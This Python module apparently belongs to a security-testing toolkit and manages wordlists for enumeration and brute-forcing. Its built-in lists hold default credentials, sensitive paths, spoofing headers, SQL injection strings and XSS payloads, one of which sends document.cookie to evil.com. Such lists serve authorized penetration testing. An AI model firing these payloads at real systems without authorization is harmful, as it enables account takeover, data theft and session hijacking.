"""Custom wordlist manager — create, store, manage, merge wordlists."""
import json
import os

WORDLIST_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "..", "wordlists")
BUILTIN = {
    "common-dirs": ["admin", "login", "config", "backup", "api", "test", "dev", "staging", "old", "tmp", "secret", "private", "internal", "dashboard", "panel", "wp-admin", "phpmyadmin", "status", "health", "debug", ".git", ".env", ".svn", ".htaccess"],
    "common-users": ["admin", "root", "user", "test", "guest", "support", "operator", "backup", "postgres", "mysql", "sa", "administrator", "default", "demo", "public"],
    "common-passwords": ["password", "123456", "admin", "root", "toor", "pass123", "password123", "admin123", "letmein", "welcome", "qwerty", "changeme", "test", "guest", "P@ssw0rd", "password1", "12345678", "abc123", "monkey", "dragon"],
    "common-subdomains": ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3", "dev", "www2", "admin", "api", "v1", "v2", "staging", "stage", "prod"],
    "common-params": ["id", "q", "search", "query", "page", "url", "file", "path", "dir", "cmd", "user", "name", "username", "password", "email", "token", "key", "redirect", "next", "return", "ref", "callback", "action", "type", "sort", "order"],
    "common-headers": ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Original-URL", "X-Rewrite-URL", "X-Custom-IP-Authorization", "X-Forwarded-Host", "Host", "Referer", "Origin", "User-Agent", "Accept", "Cookie", "Authorization"],
    "sqli-payloads": ["'", "\"", "')", "'))", "'; --", "' OR '1'='1", "' OR '1'='1' --", "' UNION SELECT NULL--", "' AND SLEEP(5)--", "1' AND 1=1--", "1' AND 1=2--", "' UNION SELECT username,password FROM users--"],
    "xss-payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "<body onload=alert(1)>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "<script>document.location='https://evil.com/?c='+document.cookie</script>"],
}


def custom_wordlist(action: str, name: str = "", words: str = "", wordlist: str = "", source: str = "", ext: str = "") -> str:
    os.makedirs(WORDLIST_DIR, exist_ok=True)

    if action == "create":
        return _create(name, words)
    elif action == "list":
        return _list_all()
    elif action == "show":
        return _show(name)
    elif action == "delete":
        return _delete(name)
    elif action == "merge":
        return _merge(name, wordlist)
    elif action == "generate":
        return _generate(name, source, ext)
    elif action == "import":
        return _import(name, source)
    elif action == "builtin":
        return json.dumps({"builtin_wordlists": list(BUILTIN.keys())}, indent=2)
    elif action == "append":
        return _append(name, words)
    else:
        return json.dumps({"error": f"Unknown action: {action}", "actions": ["create", "list", "show", "delete", "merge", "generate", "import", "builtin", "append"]}, indent=2)


def _create(name, words):
    word_list = [w.strip() for w in words.split(",") if w.strip()] if words else BUILTIN.get(name, [])
    path = os.path.join(WORDLIST_DIR, f"{name}.txt")
    with open(path, "w") as f:
        f.write("\n".join(word_list))
    return json.dumps({"status": "created", "name": name, "path": path, "word_count": len(word_list)}, indent=2)


def _list_all():
    wordlists = []
    for f in os.listdir(WORDLIST_DIR):
        if f.endswith(".txt"):
            path = os.path.join(WORDLIST_DIR, f)
            size = os.path.getsize(path)
            with open(path) as fh:
                count = sum(1 for _ in fh)
            wordlists.append({"name": f[:-4], "file": f, "words": count, "size_bytes": size})
    return json.dumps({"custom_wordlists": wordlists, "builtin": list(BUILTIN.keys()), "total_custom": len(wordlists)}, indent=2)


def _show(name):
    if name in BUILTIN:
        return json.dumps({"name": name, "type": "builtin", "words": BUILTIN[name], "count": len(BUILTIN[name])}, indent=2)
    path = os.path.join(WORDLIST_DIR, f"{name}.txt")
    if not os.path.exists(path):
        return json.dumps({"error": f"Wordlist not found: {name}"}, indent=2)
    with open(path) as f:
        words = [line.strip() for line in f if line.strip()]
    return json.dumps({"name": name, "type": "custom", "words": words, "count": len(words)}, indent=2)


def _delete(name):
    path = os.path.join(WORDLIST_DIR, f"{name}.txt")
    if os.path.exists(path):
        os.remove(path)
        return json.dumps({"status": "deleted", "name": name}, indent=2)
    return json.dumps({"error": f"Not found: {name}"}, indent=2)


def _merge(name, wordlist):
    names = [n.strip() for n in wordlist.split(",")]
    merged = set()
    for n in names:
        if n in BUILTIN:
            merged.update(BUILTIN[n])
        path = os.path.join(WORDLIST_DIR, f"{n}.txt")
        if os.path.exists(path):
            with open(path) as f:
                merged.update(line.strip() for line in f if line.strip())
    out_path = os.path.join(WORDLIST_DIR, f"{name}.txt")
    with open(out_path, "w") as f:
        f.write("\n".join(sorted(merged)))
    return json.dumps({"status": "merged", "name": name, "sources": names, "word_count": len(merged)}, indent=2)


def _generate(name, source, ext):
    import itertools
    if not source:
        return json.dumps({"error": "Required: list of words to generate from e.g. admin,test,dev"}, indent=2)
    base_words = [w.strip() for w in source.split(",")]
    suffixes = ["1", "2", "123", "2024", "2025", "2026", "dev", "staging", "prod", "-admin", "-test", "-dev", "!", "@", "#"]
    if ext:
        exts = [e.strip() for e in ext.split(",")]
    else:
        exts = [".txt", ".php", ".asp", ".html", ".bak", ".old", ".zip", ".sql", ".tar.gz"]
    generated = set()
    for word in base_words:
        generated.add(word)
        for suffix in suffixes:
            generated.add(f"{word}{suffix}")
        for e in exts:
            generated.add(f"{word}{e}")
        generated.add(f"{word}.backup")
        generated.add(f"{word}.config")
    path = os.path.join(WORDLIST_DIR, f"{name}.txt")
    with open(path, "w") as f:
        f.write("\n".join(sorted(generated)))
    return json.dumps({"status": "generated", "name": name, "word_count": len(generated), "path": path}, indent=2)


def _import(name, source):
    if not os.path.exists(source):
        return json.dumps({"error": f"Source file not found: {source}"}, indent=2)
    with open(source) as f:
        words = [line.strip() for line in f if line.strip()]
    out_path = os.path.join(WORDLIST_DIR, f"{name}.txt")
    with open(out_path, "w") as f:
        f.write("\n".join(words))
    return json.dumps({"status": "imported", "name": name, "source": source, "word_count": len(words)}, indent=2)


def _append(name, words):
    path = os.path.join(WORDLIST_DIR, f"{name}.txt")
    new_words = [w.strip() for w in words.split(",") if w.strip()]
    existing = set()
    if os.path.exists(path):
        with open(path) as f:
            existing.update(line.strip() for line in f if line.strip())
    existing.update(new_words)
    with open(path, "w") as f:
        f.write("\n".join(sorted(existing)))
    return json.dumps({"status": "appended", "name": name, "new_words": len(new_words), "total_words": len(existing)}, indent=2)